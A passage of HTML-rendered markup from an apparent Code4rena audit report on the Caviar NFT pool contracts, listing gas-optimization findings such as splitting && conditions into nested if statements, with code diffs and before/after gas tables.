b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..8a99e47 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -320,8 +320,8 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualNftReserves += uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        virtualBaseTokenReserves = virtualBaseTokenReserves - uint128(netOutputAmount + protocolFeeAmount + feeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        virtualNftReserves = virtualNftReserves + uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Interactions ~~~ //</span></span></span></code></pre>\n<h2 id=\"g-07-if-statements-that-use--can-be-refactored-into-nested-if-statements\" style=\"position:relative;\"><a href=\"#g-07-if-statements-that-use--can-be-refactored-into-nested-if-statements\" aria-label=\"g 07 if statements that use  can be refactored into nested if statements permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] <code>If</code> statements that use <code>&#x26;&#x26;</code> can be refactored into nested <code>if</code> statements</h2>\n<p>Total Instances: <code>9</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L225\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L225</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L277\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L277</a></p>\n<p><em>Gas Savings for <code>PrivatePool.buy</code>, obtained via protocol’s tests: Avg 25 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>74037</td>\n<td>158864</td>\n<td>70884</td>\n<td>24</td>\n</tr>\n<tr>\n<td>After</td>\n<td>74011</td>\n<td>158793</td>\n<td>70859</td>\n<td>24</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">277</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..73492e8 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -222,7 +222,11 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check that the caller sent 0 ETH if the base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (msg.value &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -274,11 +278,13 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // transfer the royalty fee to the recipient if it&#39;s greater than 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                if (royaltyFee &gt; 0 &amp;&amp; recipient != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    if (baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                        ERC20(baseToken).safeTransfer(recipient, royaltyFee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                        recipient.safeTransferETH(royaltyFee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                if (royaltyFee &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if (recipient != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        if (baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            ERC20(baseToken).safeTransfer(recipient, royaltyFee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            recipient.safeTransferETH(royaltyFee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L344-L350\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L344-L350</a></p>\n<p><em>Gas Savings for <code>PrivatePool.sell</code>, obtained via protocol’s tests: Avg 29 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>50139</td>\n<td>170448</td>\n<td>81969</td>\n<td>25</td>\n</tr>\n<tr>\n<td>After</td>\n<td>50139</td>\n<td>170394</td>\n<td>81940</td>\n<td>25</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">344</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">345</span><span class=\"mtk1\">:                    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">346</span><span class=\"mtk1\">:                        </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">347</span><span class=\"mtk1\">:                    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">348</span><span class=\"mtk1\">:                        </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">349</span><span class=\"mtk1\">:                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">350</span><span class=\"mtk1\">:                }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..a3218eb 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -341,11 +341,13 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 royaltyFeeAmount += royaltyFee;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // transfer the royalty fee to the recipient if it&#39;s greater than 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                if (royaltyFee &gt; 0 &amp;&amp; recipient != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    if (baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                        ERC20(baseToken).safeTransfer(recipient, royaltyFee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                        recipient.safeTransferETH(royaltyFee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                if (royaltyFee &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if (recipient != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        if (baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            ERC20(baseToken).safeTransfer(recipient, royaltyFee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            recipient.safeTransferETH(royaltyFee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L397\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L397</a></p>\n<p><em>Gas Savings for <code>PrivatePool.change</code>, obtained via protocol’s tests: Avg 25 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>116432</td>\n<td>142008</td>\n<td>82138</td>\n<td>17</td>\n</tr>\n<tr>\n<td>After</td>\n<td>116406</td>\n<td>141982</td>\n<td>82113</td>\n<td>17</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"120\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">397</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"121\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..e9bd8f2 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -394,7 +394,11 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Checks ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check that the caller sent 0 ETH if base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (msg.value &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check that NFTs are not stolen</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (useStolenNftOracle) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L635\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L635</a></p>\n<p><em>Gas Savings for <code>PrivatePool.flashLoan</code>, obtained via protocol’s tests: Avg 16 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>83063</td>\n<td>103206</td>\n<td>83063</td>\n<td>2</td>\n</tr>\n<tr>\n<td>After</td>\n<td>83047</td>\n<td>103185</td>\n<td>83047</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"122\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">635</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"123\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..fe5c440 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -632,7 +632,11 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 fee = flashFee(token, tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // if base token is ETH then check that caller sent enough for the fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken == address(0) &amp;&amp; msg.value &lt; fee) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (baseToken == address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (msg.value &lt; fee) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer the NFT to the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         ERC721(token).safeTransferFrom(address(this), address(receiver), tokenId);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L101-L103\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L101-L103</a></p>\n<p><em>Gas Savings for <code>EthRouter.buy</code>, obtained via protocol’s tests: Avg 10 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>187054</td>\n<td>397581</td>\n<td>199750</td>\n<td>7</td>\n</tr>\n<tr>\n<td>After</td>\n<td>187044</td>\n<td>397569</td>\n<td>199740</td>\n<td>7</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"124\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">deadline</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">deadline</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">102</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DeadlinePassed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">103</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"125\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/EthRouter.sol b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 125001d..41ef7bf 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -98,8 +98,10 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param payRoyalties Whether to pay royalties or not.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function buy(Buy[] calldata buys, uint256 deadline, bool payRoyalties) public payable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check that the deadline has not passed (if any)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (block.timestamp &gt; deadline &amp;&amp; deadline != 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            revert DeadlinePassed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (block.timestamp &gt; deadline) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (deadline != 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                revert DeadlinePassed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p>The instances below are similar to the one above:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L154-L156\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L154-L156</a></p>\n<p><em>Gas Savings for <code>EthRouter.sell</code>, obtained via protocol’s tests: Avg 11 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># 